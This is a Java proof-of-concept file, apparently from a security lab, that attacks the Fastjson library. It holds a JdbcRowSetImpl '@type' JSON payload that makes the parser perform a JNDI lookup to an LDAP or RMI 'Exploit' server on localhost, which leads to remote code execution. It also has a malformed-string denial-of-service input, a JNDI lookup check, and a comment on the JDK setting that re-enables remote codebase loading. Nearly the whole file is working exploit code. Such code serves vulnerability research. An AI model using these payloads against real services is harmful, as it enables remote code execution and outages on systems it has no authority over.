package com.lyhistory.rce.fastjson.rmi_jndi;

import java.net.MalformedURLException;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

/**
 * 
 * @author yue.liu
 * Test Method 1
 */
public class AttackerPayload {
	public static void main(String[] argv)
			throws NamingException, MalformedURLException, RemoteException, NotBoundException {
		//verifyRmi(); // verify rmi work or not
		//testJdbcRowSetImpl();
		testDOS();
	}
	public static void testDOS() {

		JSON.parse("[{\"a\":\"a\\x]");

	}
	public static void verifyRmi() throws NamingException, MalformedURLException, RemoteException, NotBoundException {
		Context context = new InitialContext();
		Object obj = context.lookup("rmi://127.0.0.1/Exploit");
		// Object obj = Naming.lookup("rmi://127.0.0.1/Exploit");
		System.out.println("obj:" + obj);
	}

	public static void testJdbcRowSetImpl() {

		// LADP
		String payload1 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\","
				+ " \"autoCommit\":true}";
		// RMI
		// >=JDK 8u121 need this setting
		// System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
		String payload2 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/Exploit\",\"autoCommit\":true}";
		JSONObject.parseObject(payload2);
	}
	
	
}
